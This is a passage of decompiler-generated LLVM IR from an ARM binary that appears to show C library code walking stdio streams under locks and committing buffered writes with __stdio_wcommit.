  %v1_16ed0 = phi i32 [ %v0_16ecc, %dec_label_pc_16ecc ], [ %v2_16ea0, %dec_label_pc_16ea0 ], [ %v1_16eb0.pre, %dec_label_pc_16eb8.dec_label_pc_16eac_crit_edge ]
  %v3_16ed0 = icmp uge i32 %v0_16ed8, %v1_16ed0
  store i1 %v3_16ed0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ed0 = icmp eq i32 %v0_16ed8, %v1_16ed0
  br i1 %v9_16ed0, label %dec_label_pc_16ed8, label %dec_label_pc_16ed0.dec_label_pc_16ea0_crit_edge

dec_label_pc_16ed0.dec_label_pc_16ea0_crit_edge:  ; preds = %dec_label_pc_16ed0
  %v0_16ea0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16ea0

dec_label_pc_16ed8:                               ; preds = %dec_label_pc_16ed0
  %v2_16ed8 = icmp ne i32 %v1_16ed0, 0
  store i1 %v2_16ed8, i1* %cpsr_c.global-to-local, align 1
  %v7_16edc = icmp slt i32 %v1_16ed0, 2
  br i1 %v7_16edc, label %dec_label_pc_16ef8, label %dec_label_pc_16ee0

dec_label_pc_16ee0:                               ; preds = %dec_label_pc_16ed8
  %v0_16ee0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16ee0, i32* %r0.global-to-local, align 4
  %v0_16ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ee4 = add i32 %v0_16ee4, 129
  store i32 %v1_16ee4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ef8

dec_label_pc_16ef8:                               ; preds = %dec_label_pc_16e70, %dec_label_pc_16ee0, %dec_label_pc_16ed8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16efc = load i32, i32* @r6, align 4
  %v2_16efc = add i32 %v0_16efc, 152
  %v3_16efc = inttoptr i32 %v2_16efc to i32*
  %v4_16efc = load i32, i32* %v3_16efc, align 4
  store i32 %v4_16efc, i32* %r5.global-to-local, align 4
  %v1_16f00 = add i32 %v4_16efc, 8
  %v2_16f00 = inttoptr i32 %v1_16f00 to i32*
  %v3_16f00 = load i32, i32* %v2_16f00, align 4
  store i32 %v3_16f00, i32* %r3.global-to-local, align 4
  %v1_16f04 = load i32, i32* %r8.global-to-local, align 4
  %v3_16f04 = icmp uge i32 %v3_16f00, %v1_16f04
  store i1 %v3_16f04, i1* %cpsr_c.global-to-local, align 1
  %v9_16f04 = icmp eq i32 %v3_16f00, %v1_16f04
  br i1 %v9_16f04, label %dec_label_pc_16f4c, label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16ef8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16efc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16f18123 = inttoptr i32 %v4_16efc to i32*
  %v2_16f18124 = load i32, i32* %v1_16f18123, align 4
  store i32 %v2_16f18124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16f1c126 = icmp eq i32 %v2_16f18124, 0
  br i1 %v9_16f1c126, label %dec_label_pc_16f24, label %dec_label_pc_16f3c

dec_label_pc_16f24:                               ; preds = %dec_label_pc_16f0c, %dec_label_pc_16f24.dec_label_pc_16f18_crit_edge
  %v0_16f24127 = phi i32 [ %v1_16f1c.pre, %dec_label_pc_16f24.dec_label_pc_16f18_crit_edge ], [ 0, %dec_label_pc_16f0c ]
  store i32 %v0_16f24127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16f34 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16f34, label %dec_label_pc_16f38, label %dec_label_pc_16f24.dec_label_pc_16f18_crit_edge

dec_label_pc_16f24.dec_label_pc_16f18_crit_edge:  ; preds = %dec_label_pc_16f24
  %v0_16f18.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16f1c.pre = load i32, i32* @r4, align 4
  %v1_16f18 = inttoptr i32 %v0_16f18.pre to i32*
  %v2_16f18 = load i32, i32* %v1_16f18, align 4
  store i32 %v2_16f18, i32* %r3.global-to-local, align 4
  %v3_16f1c = icmp uge i32 %v2_16f18, %v1_16f1c.pre
  store i1 %v3_16f1c, i1* %cpsr_c.global-to-local, align 1
  %v9_16f1c = icmp eq i32 %v2_16f18, %v1_16f1c.pre
  br i1 %v9_16f1c, label %dec_label_pc_16f24, label %dec_label_pc_16f3c

dec_label_pc_16f38:                               ; preds = %dec_label_pc_16f24
  %v0_16f38 = load i32, i32* @r4, align 4
  store i32 %v0_16f38, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f3c

dec_label_pc_16f3c:                               ; preds = %dec_label_pc_16f0c, %dec_label_pc_16f24.dec_label_pc_16f18_crit_edge, %dec_label_pc_16f38
  %v0_16f3c = phi i32 [ %v0_16f38, %dec_label_pc_16f38 ], [ %v2_16f18124, %dec_label_pc_16f0c ], [ %v2_16f18, %dec_label_pc_16f24.dec_label_pc_16f18_crit_edge ]
  %v1_16f3c = phi i32 [ %v0_16f38, %dec_label_pc_16f38 ], [ 0, %dec_label_pc_16f0c ], [ %v1_16f1c.pre, %dec_label_pc_16f24.dec_label_pc_16f18_crit_edge ]
  %v3_16f3c = icmp uge i32 %v0_16f3c, %v1_16f3c
  store i1 %v3_16f3c, i1* %cpsr_c.global-to-local, align 1
  %v9_16f3c = icmp eq i32 %v0_16f3c, %v1_16f3c
  br i1 %v9_16f3c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_16f3c
  %v1_16f40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16f40, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_16f3c, %bb67
  %v1_16f44 = xor i1 %v9_16f3c, true
  call void @__pseudo_cond_branch(i1 %v1_16f44, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_16f48 = load i32, i32* %r8.global-to-local, align 4
  %v1_16f48 = load i32, i32* %r5.global-to-local, align 4
  %v2_16f48 = add i32 %v1_16f48, 8
  %v3_16f48 = inttoptr i32 %v2_16f48 to i32*
  store i32 %v0_16f48, i32* %v3_16f48, align 4
  %v0_16f50.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16f4c

dec_label_pc_16f4c:                               ; preds = %dec_label_pc_16ef8, %bb68
  %v0_16f5c = phi i32 [ %v0_16efc, %dec_label_pc_16ef8 ], [ %v0_16f50.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16f50 = add i32 %v0_16f5c, 152
  %v3_16f50 = inttoptr i32 %v2_16f50 to i32*
  %v4_16f50 = load i32, i32* %v3_16f50, align 4
  store i32 %v4_16f50, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16f58 = add i32 %v4_16f50, 4
  %v2_16f58 = inttoptr i32 %v1_16f58 to i32*
  %v3_16f58 = load i32, i32* %v2_16f58, align 4
  store i32 %v3_16f58, i32* %r1.global-to-local, align 4
  %v2_16f5c = add i32 %v0_16f5c, 76
  %v3_16f5c = inttoptr i32 %v2_16f5c to i32*
  %v4_16f5c = load i32, i32* %v3_16f5c, align 4
  store i32 %v4_16f5c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16f60 = icmp eq i32 %v3_16f58, 0
  %v1_16f64 = inttoptr i32 %v4_16f5c to i32*
  %v2_16f64 = load i32, i32* %v1_16f64, align 4
  store i32 %v2_16f64, i32* @r5, align 4
  br i1 %v2_16f60, label %dec_label_pc_16f6c, label %dec_label_pc_16fcc

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16f4c
  %v2_16f6c = add i32 %v4_16f50, 8
  %v3_16f6c = inttoptr i32 %v2_16f6c to i32*
  store i32 0, i32* %v3_16f6c, align 4
  %v0_16f70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16f70, i32* @r7, align 4
  br label %dec_label_pc_16f74

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16fa4.dec_label_pc_16f74_crit_edge, %dec_label_pc_16f6c
  %v0_16f74 = phi i32 [ %v0_16f74.pre, %dec_label_pc_16fa4.dec_label_pc_16f74_crit_edge ], [ %v0_16f70, %dec_label_pc_16f6c ]
  %v1_16f74 = inttoptr i32 %v0_16f74 to i32*
  %v2_16f74 = load i32, i32* %v1_16f74, align 4
  store i32 %v2_16f74, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16f74, i32* %r2.global-to-local, align 4
  %v2_16f80111 = load i32, i32* %v1_16f74, align 4
  store i32 %v2_16f80111, i32* %r3.global-to-local, align 4
  %v3_16f84113 = icmp uge i32 %v2_16f80111, %v2_16f74
  store i1 %v3_16f84113, i1* %cpsr_c.global-to-local, align 1
  %v9_16f84119 = icmp eq i32 %v2_16f80111, %v2_16f74
  br i1 %v9_16f84119, label %dec_label_pc_16f8c, label %dec_label_pc_16fa4

dec_label_pc_16f8c:                               ; preds = %dec_label_pc_16f74, %dec_label_pc_16f8c.dec_label_pc_16f80_crit_edge
  %v0_16f8c120 = phi i32 [ %v1_16f84.pre, %dec_label_pc_16f8c.dec_label_pc_16f80_crit_edge ], [ %v2_16f74, %dec_label_pc_16f74 ]
  store i32 %v0_16f8c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16f9c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16f9c, label %dec_label_pc_16fa0, label %dec_label_pc_16f8c.dec_label_pc_16f80_crit_edge

dec_label_pc_16f8c.dec_label_pc_16f80_crit_edge:  ; preds = %dec_label_pc_16f8c
  %v0_16f80.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16f84.pre = load i32, i32* @r4, align 4
  %v1_16f80 = inttoptr i32 %v0_16f80.pre to i32*
  %v2_16f80 = load i32, i32* %v1_16f80, align 4
  store i32 %v2_16f80, i32* %r3.global-to-local, align 4
  %v3_16f84 = icmp uge i32 %v2_16f80, %v1_16f84.pre
  store i1 %v3_16f84, i1* %cpsr_c.global-to-local, align 1
  %v9_16f84 = icmp eq i32 %v2_16f80, %v1_16f84.pre
  br i1 %v9_16f84, label %dec_label_pc_16f8c, label %dec_label_pc_16fa4

dec_label_pc_16fa0:                               ; preds = %dec_label_pc_16f8c
  %v0_16fa0 = load i32, i32* @r4, align 4
  store i32 %v0_16fa0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16fa4

dec_label_pc_16fa4:                               ; preds = %dec_label_pc_16f74, %dec_label_pc_16f8c.dec_label_pc_16f80_crit_edge, %dec_label_pc_16fa0
  %v0_16fac = phi i32 [ %v0_16fa0, %dec_label_pc_16fa0 ], [ %v2_16f80111, %dec_label_pc_16f74 ], [ %v2_16f80, %dec_label_pc_16f8c.dec_label_pc_16f80_crit_edge ]
  %v1_16fa4 = phi i32 [ %v0_16fa0, %dec_label_pc_16fa0 ], [ %v2_16f74, %dec_label_pc_16f74 ], [ %v1_16f84.pre, %dec_label_pc_16f8c.dec_label_pc_16f80_crit_edge ]
  %v3_16fa4 = icmp uge i32 %v0_16fac, %v1_16fa4
  store i1 %v3_16fa4, i1* %cpsr_c.global-to-local, align 1
  %v9_16fa4 = icmp eq i32 %v0_16fac, %v1_16fa4
  br i1 %v9_16fa4, label %dec_label_pc_16fac, label %dec_label_pc_16fa4.dec_label_pc_16f74_crit_edge

dec_label_pc_16fa4.dec_label_pc_16f74_crit_edge:  ; preds = %dec_label_pc_16fa4
  %v0_16f74.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16f74

dec_label_pc_16fac:                               ; preds = %dec_label_pc_16fa4
  %v2_16fac = icmp ne i32 %v1_16fa4, 0
  store i1 %v2_16fac, i1* %cpsr_c.global-to-local, align 1
  %v7_16fb0 = icmp slt i32 %v1_16fa4, 2
  br i1 %v7_16fb0, label %dec_label_pc_16fccthread-pre-split, label %dec_label_pc_16fb4

dec_label_pc_16fb4:                               ; preds = %dec_label_pc_16fac
  %v0_16fb4 = load i32, i32* @r7, align 4
  store i32 %v0_16fb4, i32* %r0.global-to-local, align 4
  %v0_16fb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16fb8 = add i32 %v0_16fb8, 129
  store i32 %v1_16fb8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16fccthread-pre-split

dec_label_pc_16fccthread-pre-split:               ; preds = %dec_label_pc_16fac, %dec_label_pc_16fb4
  %v0_17118.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_16fccthread-pre-split, %dec_label_pc_16f4c
  %v0_17118.pr = phi i32 [ %v0_17118.pr.pr, %dec_label_pc_16fccthread-pre-split ], [ %v2_16f64, %dec_label_pc_16f4c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1711818 = icmp eq i32 %v0_17118.pr, 0
  br i1 %v2_1711818, label %dec_label_pc_17120, label %dec_label_pc_16fdc

dec_label_pc_16fdc:                               ; preds = %dec_label_pc_16fcc, %dec_label_pc_17114
  %v0_17004 = phi i32 [ %v3_17114, %dec_label_pc_17114 ], [ %v0_17118.pr, %dec_label_pc_16fcc ]
  %v1_16fdc = inttoptr i32 %v0_17004 to i16*
  %v2_16fdc = load i16, i16* %v1_16fdc, align 2
  %v3_16fdc = zext i16 %v2_16fdc to i32
  store i32 %v3_16fdc, i32* %r3.global-to-local, align 4
  %v1_16fe0 = and i32 %v3_16fdc, 64
  %v2_16fe0 = icmp eq i32 %v1_16fe0, 0
  br i1 %v2_16fe0, label %dec_label_pc_17114, label %dec_label_pc_16fe8

dec_label_pc_16fe8:                               ; preds = %dec_label_pc_16fdc
  %v0_16fe8 = load i32, i32* @r6, align 4
  %v1_16fe8 = load i32, i32* %sb.global-to-local, align 4
  %v2_16fe8 = add i32 %v1_16fe8, %v0_16fe8
  %v3_16fe8 = inttoptr i32 %v2_16fe8 to i32*
  %v4_16fe8 = load i32, i32* %v3_16fe8, align 4
  store i32 %v4_16fe8, i32* %r3.global-to-local, align 4
  %v1_16fec = inttoptr i32 %v4_16fe8 to i32*
  %v2_16fec = load i32, i32* %v1_16fec, align 4
  store i32 %v2_16fec, i32* %r3.global-to-local, align 4
  %v2_16ff0 = icmp ugt i32 %v2_16fec, 1
  store i1 %v2_16ff0, i1* %cpsr_c.global-to-local, align 1
  %v7_16ff0 = icmp eq i32 %v2_16fec, 2
  br i1 %v7_16ff0, label %dec_label_pc_17054, label %dec_label_pc_16ff8

dec_label_pc_16ff8:                               ; preds = %dec_label_pc_16fe8
  %v1_16ff8 = add i32 %v0_17004, 64
  %v2_16ff8 = inttoptr i32 %v1_16ff8 to i32*
  %v3_16ff8 = load i32, i32* %v2_16ff8, align 4
  store i32 %v3_16ff8, i32* %r3.global-to-local, align 4
  %v1_16ffc = load i32, i32* %r8.global-to-local, align 4
  %v3_16ffc = icmp uge i32 %v3_16ff8, %v1_16ffc
  store i1 %v3_16ffc, i1* %cpsr_c.global-to-local, align 1
  %v9_16ffc = icmp eq i32 %v3_16ff8, %v1_16ffc
  br i1 %v9_16ffc, label %dec_label_pc_17048, label %dec_label_pc_17004

dec_label_pc_17004:                               ; preds = %dec_label_pc_16ff8
  %v1_17004 = add i32 %v0_17004, 56
  store i32 %v1_17004, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_17004, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1701486 = inttoptr i32 %v1_17004 to i32*
  %v2_1701487 = load i32, i32* %v1_1701486, align 4
  store i32 %v2_1701487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1701894 = icmp eq i32 %v2_1701487, 0
  br i1 %v9_1701894, label %dec_label_pc_17020, label %dec_label_pc_17038

dec_label_pc_17020:                               ; preds = %dec_label_pc_17004, %dec_label_pc_17020.dec_label_pc_17014_crit_edge
  %v0_1702095 = phi i32 [ %v1_17018.pre, %dec_label_pc_17020.dec_label_pc_17014_crit_edge ], [ 0, %dec_label_pc_17004 ]
  store i32 %v0_1702095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17030 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17030, label %dec_label_pc_17034, label %dec_label_pc_17020.dec_label_pc_17014_crit_edge

dec_label_pc_17020.dec_label_pc_17014_crit_edge:  ; preds = %dec_label_pc_17020
  %v0_17014.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17018.pre = load i32, i32* @r4, align 4
  %v1_17014 = inttoptr i32 %v0_17014.pre to i32*
  %v2_17014 = load i32, i32* %v1_17014, align 4
  store i32 %v2_17014, i32* %r3.global-to-local, align 4
  %v3_17018 = icmp uge i32 %v2_17014, %v1_17018.pre
  store i1 %v3_17018, i1* %cpsr_c.global-to-local, align 1
  %v9_17018 = icmp eq i32 %v2_17014, %v1_17018.pre
  br i1 %v9_17018, label %dec_label_pc_17020, label %dec_label_pc_17038

dec_label_pc_17034:                               ; preds = %dec_label_pc_17020
  %v0_17034 = load i32, i32* @r4, align 4
  store i32 %v0_17034, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %dec_label_pc_17004, %dec_label_pc_17020.dec_label_pc_17014_crit_edge, %dec_label_pc_17034
  %v0_17038 = phi i32 [ %v0_17034, %dec_label_pc_17034 ], [ %v2_1701487, %dec_label_pc_17004 ], [ %v2_17014, %dec_label_pc_17020.dec_label_pc_17014_crit_edge ]
  %v1_17038 = phi i32 [ %v0_17034, %dec_label_pc_17034 ], [ 0, %dec_label_pc_17004 ], [ %v1_17018.pre, %dec_label_pc_17020.dec_label_pc_17014_crit_edge ]
  %v3_17038 = icmp uge i32 %v0_17038, %v1_17038
  store i1 %v3_17038, i1* %cpsr_c.global-to-local, align 1
  %v9_17038 = icmp eq i32 %v0_17038, %v1_17038
  br i1 %v9_17038, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_17038
  %v1_1703c = load i32, i32* @r7, align 4
  store i32 %v1_1703c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_17038, %bb69
  %v1_17040 = xor i1 %v9_17038, true
  call void @__pseudo_cond_branch(i1 %v1_17040, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_17044 = load i32, i32* %r8.global-to-local, align 4
  %v1_17044 = load i32, i32* @r5, align 4
  %v2_17044 = add i32 %v1_17044, 64
  %v3_17044 = inttoptr i32 %v2_17044 to i32*
  store i32 %v0_17044, i32* %v3_17044, align 4
  %v0_17048.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17048

dec_label_pc_17048:                               ; preds = %dec_label_pc_16ff8, %bb70
  %v0_17048 = phi i32 [ %v0_17004, %dec_label_pc_16ff8 ], [ %v0_17048.pre, %bb70 ]
  %v1_17048 = add i32 %v0_17048, 60
  %v2_17048 = inttoptr i32 %v1_17048 to i32*
  %v3_17048 = load i32, i32* %v2_17048, align 4
  %v1_1704c = add i32 %v3_17048, 1
  store i32 %v1_1704c, i32* %r3.global-to-local, align 4
  store i32 %v1_1704c, i32* %v2_17048, align 4
  %v0_17054.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17054

dec_label_pc_17054:                               ; preds = %dec_label_pc_16fe8, %dec_label_pc_17048
  %v0_1706c = phi i32 [ %v0_17004, %dec_label_pc_16fe8 ], [ %v0_17054.pre, %dec_label_pc_17048 ]
  %v1_17054 = inttoptr i32 %v0_1706c to i16*
  %v2_17054 = load i16, i16* %v1_17054, align 2
  %v3_17054 = zext i16 %v2_17054 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1705c = or i32 %v3_17054, %stack_var_-44.1
  %v1_17060 = xor i32 %v2_1705c, 320
  store i32 %v1_17060, i32* %r3.global-to-local, align 4
  %v1_17064 = and i32 %v1_17060, 832
  %v2_17064 = icmp eq i32 %v1_17064, 0
  br i1 %v2_17064, label %dec_label_pc_1706c, label %bb71

dec_label_pc_1706c:                               ; preds = %dec_label_pc_17054
  store i32 %v0_1706c, i32* %r0.global-to-local, align 4
  %v1_17070 = call i32 @__stdio_wcommit(i32 %v0_1706c)
  store i32 %v1_17070, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17074 = icmp eq i32 %v1_17070, 0
  br i1 %v2_17074, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1706c
  %v1_17078 = load i32, i32* @r5, align 4
  %v2_17078 = inttoptr i32 %v1_17078 to i16*
  %v3_17078 = load i16, i16* %v2_17078, align 2
  %v4_17078 = zext i16 %v3_17078 to i32
  store i32 %v4_17078, i32* %r3.global-to-local, align 4
  %v2_1707c = add i32 %v1_17078, 8
  %v3_1707c = inttoptr i32 %v2_1707c to i32*
  %v4_1707c = load i32, i32* %v3_1707c, align 4
  store i32 %v4_1707c, i32* %r2.global-to-local, align 4
  %v2_17080 = and i32 %v4_17078, 65471
  store i32 %v2_17080, i32* %r3.global-to-local, align 4
  %v3_17084 = add i32 %v1_17078, 28
  %v4_17084 = inttoptr i32 %v3_17084 to i32*
  store i32 %v4_1707c, i32* %v4_17084, align 4
  %v1_17088 = load i32, i32* %r3.global-to-local, align 4
  %v2_17088 = trunc i32 %v1_17088 to i16
  %v3_17088 = load i32, i32* @r5, align 4
  %v4_17088 = inttoptr i32 %v3_17088 to i16*
  store i16 %v2_17088, i16* %v4_17088, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1706c
  %v1_1708c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1708c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_17054, %.thread7
  %v0_17090 = load i32, i32* @r6, align 4
  %v1_17090 = load i32, i32* %sb.global-to-local, align 4
  %v2_17090 = add i32 %v1_17090, %v0_17090
  %v3_17090 = inttoptr i32 %v2_17090 to i32*
  %v4_17090 = load i32, i32* %v3_17090, align 4
  store i32 %v4_17090, i32* %r3.global-to-local, align 4
  %v1_17094 = inttoptr i32 %v4_17090 to i32*
  %v2_17094 = load i32, i32* %v1_17094, align 4
  store i32 %v2_17094, i32* %r3.global-to-local, align 4
  %v2_17098 = icmp ugt i32 %v2_17094, 1
  store i1 %v2_17098, i1* %cpsr_c.global-to-local, align 1
  %v7_17098 = icmp eq i32 %v2_17094, 2
  br i1 %v7_17098, label %dec_label_pc_17114, label %dec_label_pc_170a0

dec_label_pc_170a0:                               ; preds = %bb71
  %v0_170a0 = load i32, i32* @r5, align 4
  %v1_170a0 = add i32 %v0_170a0, 60
  %v2_170a0 = inttoptr i32 %v1_170a0 to i32*
  %v3_170a0 = load i32, i32* %v2_170a0, align 4
  %v1_170a4 = add i32 %v3_170a0, -1
  store i32 %v1_170a4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_170a8 = icmp eq i32 %v1_170a4, 0
  store i32 %v1_170a4, i32* %v2_170a0, align 4
  br i1 %v2_170a8, label %dec_label_pc_170b4, label %dec_label_pc_17114

dec_label_pc_170b4:                               ; preds = %dec_label_pc_170a0
  %v0_170b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_170b4 = load i32, i32* @r5, align 4
  %v2_170b4 = add i32 %v1_170b4, 64
  %v3_170b4 = inttoptr i32 %v2_170b4 to i32*
  store i32 %v0_170b4, i32* %v3_170b4, align 4
  %v0_170b8 = load i32, i32* @r5, align 4
  %v1_170b8 = add i32 %v0_170b8, 56
  store i32 %v1_170b8, i32* @r7, align 4
  br label %dec_label_pc_170bc

dec_label_pc_170bc:                               ; preds = %dec_label_pc_170ec.dec_label_pc_170bc_crit_edge, %dec_label_pc_170b4
  %v0_170c4 = phi i32 [ %v0_170c4.pre, %dec_label_pc_170ec.dec_label_pc_170bc_crit_edge ], [ %v1_170b8, %dec_label_pc_170b4 ]
  %v0_170bc = phi i32 [ %v0_170bc.pre, %dec_label_pc_170ec.dec_label_pc_170bc_crit_edge ], [ %v0_170b8, %dec_label_pc_170b4 ]
  %v1_170bc = add i32 %v0_170bc, 56
  %v2_170bc = inttoptr i32 %v1_170bc to i32*
  %v3_170bc = load i32, i32* %v2_170bc, align 4
  store i32 %v3_170bc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_170c4, i32* %r2.global-to-local, align 4
  %v1_170c897 = inttoptr i32 %v0_170c4 to i32*
  %v2_170c898 = load i32, i32* %v1_170c897, align 4
  store i32 %v2_170c898, i32* %r3.global-to-local, align 4
  %v3_170cc100 = icmp uge i32 %v2_170c898, %v3_170bc
  store i1 %v3_170cc100, i1* %cpsr_c.global-to-local, align 1
  %v9_170cc106 = icmp eq i32 %v2_170c898, %v3_170bc
  br i1 %v9_170cc106, label %dec_label_pc_170d4, label %dec_label_pc_170ec

dec_label_pc_170d4:                               ; preds = %dec_label_pc_170bc, %dec_label_pc_170d4.dec_label_pc_170c8_crit_edge
  %v0_170d4107 = phi i32 [ %v1_170cc.pre, %dec_label_pc_170d4.dec_label_pc_170c8_crit_edge ], [ %v3_170bc, %dec_label_pc_170bc ]
  store i32 %v0_170d4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_170e4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_170e4, label %dec_label_pc_170e8, label %dec_label_pc_170d4.dec_label_pc_170c8_crit_edge

dec_label_pc_170d4.dec_label_pc_170c8_crit_edge:  ; preds = %dec_label_pc_170d4
  %v0_170c8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_170cc.pre = load i32, i32* @r4, align 4
  %v1_170c8 = inttoptr i32 %v0_170c8.pre to i32*
  %v2_170c8 = load i32, i32* %v1_170c8, align 4
  store i32 %v2_170c8, i32* %r3.global-to-local, align 4
  %v3_170cc = icmp uge i32 %v2_170c8, %v1_170cc.pre
  store i1 %v3_170cc, i1* %cpsr_c.global-to-local, align 1
  %v9_170cc = icmp eq i32 %v2_170c8, %v1_170cc.pre
  br i1 %v9_170cc, label %dec_label_pc_170d4, label %dec_label_pc_170ec

dec_label_pc_170e8:                               ; preds = %dec_label_pc_170d4
  %v0_170e8 = load i32, i32* @r4, align 4
  store i32 %v0_170e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_170ec

dec_label_pc_170ec:                               ; preds = %dec_label_pc_170bc, %dec_label_pc_170d4.dec_label_pc_170c8_crit_edge, %dec_label_pc_170e8
  %v0_170f4 = phi i32 [ %v0_170e8, %dec_label_pc_170e8 ], [ %v2_170c898, %dec_label_pc_170bc ], [ %v2_170c8, %dec_label_pc_170d4.dec_label_pc_170c8_crit_edge ]
  %v1_170ec = phi i32 [ %v0_170e8, %dec_label_pc_170e8 ], [ %v3_170bc, %dec_label_pc_170bc ], [ %v1_170cc.pre, %dec_label_pc_170d4.dec_label_pc_170c8_crit_edge ]
  %v3_170ec = icmp uge i32 %v0_170f4, %v1_170ec
  store i1 %v3_170ec, i1* %cpsr_c.global-to-local, align 1
  %v9_170ec = icmp eq i32 %v0_170f4, %v1_170ec
  br i1 %v9_170ec, label %dec_label_pc_170f4, label %dec_label_pc_170ec.dec_label_pc_170bc_crit_edge

dec_label_pc_170ec.dec_label_pc_170bc_crit_edge:  ; preds = %dec_label_pc_170ec
  %v0_170bc.pre = load i32, i32* @r5, align 4
  %v0_170c4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_170bc

dec_label_pc_170f4:                               ; preds = %dec_label_pc_170ec
  %v2_170f4 = icmp ne i32 %v1_170ec, 0
  store i1 %v2_170f4, i1* %cpsr_c.global-to-local, align 1
  %v7_170f8 = icmp slt i32 %v1_170ec, 2
  br i1 %v7_170f8, label %dec_label_pc_17114, label %dec_label_pc_170fc

dec_label_pc_170fc:                               ; preds = %dec_label_pc_170f4
  %v0_170fc = load i32, i32* @r5, align 4
  %v1_170fc = add i32 %v0_170fc, 56
  store i32 %v1_170fc, i32* %r0.global-to-local, align 4
  %v0_17100 = load i32, i32* %r1.global-to-local, align 4
  %v1_17100 = add i32 %v0_17100, 129
  store i32 %v1_17100, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17114

dec_label_pc_17114:                               ; preds = %dec_label_pc_170a0, %dec_label_pc_170fc, %dec_label_pc_170f4, %bb71, %dec_label_pc_16fdc
  %v0_17114 = load i32, i32* @r5, align 4
  %v1_17114 = add i32 %v0_17114, 32
  %v2_17114 = inttoptr i32 %v1_17114 to i32*
  %v3_17114 = load i32, i32* %v2_17114, align 4
  store i32 %v3_17114, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17118 = icmp eq i32 %v3_17114, 0
  br i1 %v2_17118, label %dec_label_pc_17120, label %dec_label_pc_16fdc

dec_label_pc_17120:                               ; preds = %dec_label_pc_17114, %dec_label_pc_16fcc
